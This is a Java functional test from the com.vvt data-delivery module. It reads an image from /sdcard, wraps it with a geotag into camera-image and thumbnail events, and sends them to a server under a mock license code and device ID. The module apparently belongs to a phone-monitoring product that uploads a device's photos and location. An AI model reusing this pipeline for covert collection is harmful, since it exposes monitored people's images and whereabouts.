package com.vvt.data_delivery_manager.testsfunctional;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;

import com.vvt.data_delivery_manager.tests.MockAppContext;
import com.vvt.data_delivery_manager.tests.MockLicenseManager;
import com.vvt.datadeliverymanager.DataDeliveryManager;
import com.vvt.datadeliverymanager.DeliveryRequest;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxMimeTypeParser;
import com.vvt.ioutil.FileUtil;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.command.CommandData;
import com.vvt.phoenix.prot.command.SendEvents;
import com.vvt.phoenix.prot.event.CameraImageEvent;
import com.vvt.phoenix.prot.event.CameraImageThumbnailEvent;
import com.vvt.phoenix.prot.event.Event;
import com.vvt.phoenix.prot.event.GeoTag;

public class ActualMediaCase implements DeliveryListener{
	
	private static final String TAG = "ActualMediaCase";

	private DataDeliveryManager mDataDeliveryManager;
	private FuntionalTestListener mFuntionalTestListener;
	
	//TODO : Check this code was activated before test.
	private String[] mActivatedLicense = new String[] {"01622"};
	//TODO : Check this deviced ID was activated and match with activationCode above before test.
	String[] mArrayDeviceId = new String[] {"kGxOZg1_pyWFgcv"};
	
	public ActualMediaCase(DataDeliveryManager dataDeliveryManager, FuntionalTestListener listener) {
		mDataDeliveryManager = dataDeliveryManager;
		mFuntionalTestListener = listener;
	}
	
	public void testDeliverThumbnail() {
		FxLog.v(TAG, "testDeliverThumbnail # ENTER ...");
		run(TestType.THUMB_NAIL);
		FxLog.v(TAG, "testDeliverThumbnail # EXIT ...");
	}
	
	public void testDeliverActualMedia() {
		FxLog.v(TAG, "testDeliverThumbnail # ENTER ...");
		run(TestType.ACTUAL_MEDIA);
		FxLog.v(TAG, "testDeliverThumbnail # EXIT ...");
	}
	
	/*********************************************** LOGIC SIDE ***************************************************/
	
	
	private TestType mTestType;
	private String mActivateCode;
	
	
	public void run(TestType testType) {
		
		mTestType = testType;
		
		FxLog.v(TAG, "run # ENTER ...");
		switch (mTestType) {
			case THUMB_NAIL : 
				startTestThumbnailCase();
				break;
			case ACTUAL_MEDIA :
				startTestActualMediaCase();
				break;
			default :
				break;
		}
		FxLog.v(TAG, "run # EXIT ...");
	}
	
	private void startTestThumbnailCase() {
		FxLog.v(TAG, "startTestThumbnailCase # ENTER ...");
		mActivateCode = mActivatedLicense[0];
		MockLicenseManager.setActivationCode(mActivateCode);
		String deviceIdentifier = mArrayDeviceId[0];
		MockAppContext.setDeviceId(deviceIdentifier);
		CommandData commandData = createThumbnailCommandData();
		DeliveryRequest deliveryRequest = GenerateTestValue.createDeliveryRequest(
				this,commandData, DataProviderType.DATA_PROVIDER_TYPE_ALL_REGULAR);
		mDataDeliveryManager.deliver(deliveryRequest);
		FxLog.v(TAG, "startTestThumbnailCase # EXIT ...");
		
	}
	
	private void startTestActualMediaCase() {
		FxLog.v(TAG, "startTestActualMediaCase # ENTER ...");
		mActivateCode = mActivatedLicense[0];
		MockLicenseManager.setActivationCode(mActivateCode);
		String deviceIdentifier = mArrayDeviceId[0];
		MockAppContext.setDeviceId(deviceIdentifier);
		CommandData commandData = createActualCommandData();
		DeliveryRequest deliveryRequest = GenerateTestValue.createDeliveryRequest(
				this,commandData, DataProviderType.DATA_PROVIDER_TYPE_ACTUAL_MEDIA);
		mDataDeliveryManager.deliver(deliveryRequest);
		FxLog.v(TAG, "startTestActualMediaCase # EXIT ...");
	}
	
	private CommandData createActualCommandData() {
		String tn_fullPath = "/sdcard/xxx.png";
		
		FxMediaType mediaType = FxMediaType.UNKNOWN;
		byte fileContent[] = new byte[] {};
		if (tn_fullPath != null) {
			File file = new File(tn_fullPath);
			if (file.exists()) {
				fileContent = FileUtil.readFileData(tn_fullPath);
				String ext = FileUtil.getFileExtension(tn_fullPath);
				mediaType = FxMimeTypeParser.parse(ext);
			}
		}
		
		GeoTag geoTag = new GeoTag();
		geoTag.setAltitude(101);
		geoTag.setLat(101);
		geoTag.setLon(101);
		
		// prepare Event provider
		ArrayList<Event> eventList = new ArrayList<Event>();
		CameraImageEvent ct = new CameraImageEvent();
		ct.setEventId(111);
		ct.setEventTime(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(System.currentTimeMillis()));
		ct.setFileName("xxx.png");
		ct.setGeo(geoTag);
		ct.setImageData(fileContent);
		ct.setMediaFormat(mediaType.getNumber());
		ct.setParingId(111);
		
		// ps.setEndPanic();
		eventList.add(ct);

		// set Command
		SendEvents command = new SendEvents();
		command.setEventProvider(new MyEventProvider(eventList));
		command.setEventCount(eventList.size());

		return command;
	}
	
	private CommandData createThumbnailCommandData(){
		
		String tn_fullPath = "/sdcard/xxx.png";
		
		FxMediaType mediaType = FxMediaType.UNKNOWN;
		byte fileContent[] = new byte[] {};
		if (tn_fullPath != null) {
			File file = new File(tn_fullPath);
			if (file.exists()) {
				fileContent = FileUtil.readFileData(tn_fullPath);
				String ext = FileUtil.getFileExtension(tn_fullPath);
				mediaType = FxMimeTypeParser.parse(ext);
			}
		}
		
		GeoTag geoTag = new GeoTag();
		geoTag.setAltitude(101);
		geoTag.setLat(101);
		geoTag.setLon(101);
		
		// prepare Event provider
		ArrayList<Event> eventList = new ArrayList<Event>();
		CameraImageThumbnailEvent ct = new CameraImageThumbnailEvent();
		ct.setActualSize(32065);
		ct.setEventId(1);
		ct.setEventTime(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(System.currentTimeMillis()));
		ct.setGeo(geoTag);
		ct.setImageData(fileContent);
		ct.setMediaFormat(mediaType.getNumber());
		ct.setParingId(111);
		
		//ps.setEndPanic();
		eventList.add(ct);

		// set Command
		SendEvents command = new SendEvents();
		command.setEventProvider(new MyEventProvider(eventList));
		command.setEventCount(eventList.size());
		
		return command;
	}
	
	@Override
	public void onFinish(DeliveryResponse response) {
		FxLog.w(TAG,String.format("%s ...", mTestType));
		FxLog.i(TAG, String.format("onProgress # ActualMediaCase : %s --> " +
				"Status Message : %s, " +
				"Status Code : %s " +
				"Error Type : %s",
				mActivateCode,
				response.getStatusMessage(),
				response.getStatusCode(),
				response.getErrorResponseType()));
		
		mFuntionalTestListener.onTestFinish(mTestType);
		
	}

	@Override
	public void onProgress(DeliveryResponse response) {
		FxLog.w(TAG,String.format("%s ...", mTestType));
		FxLog.i(TAG, String.format("onProgress # ActualMediaCase : %s --> " +
				"Status Message : %s, " +
				"Status Code : %s " +
				"Error Type : %s",
				mActivateCode,
				response.getStatusMessage(),
				response.getStatusCode(),
				response.getErrorResponseType()));
		
	}

}
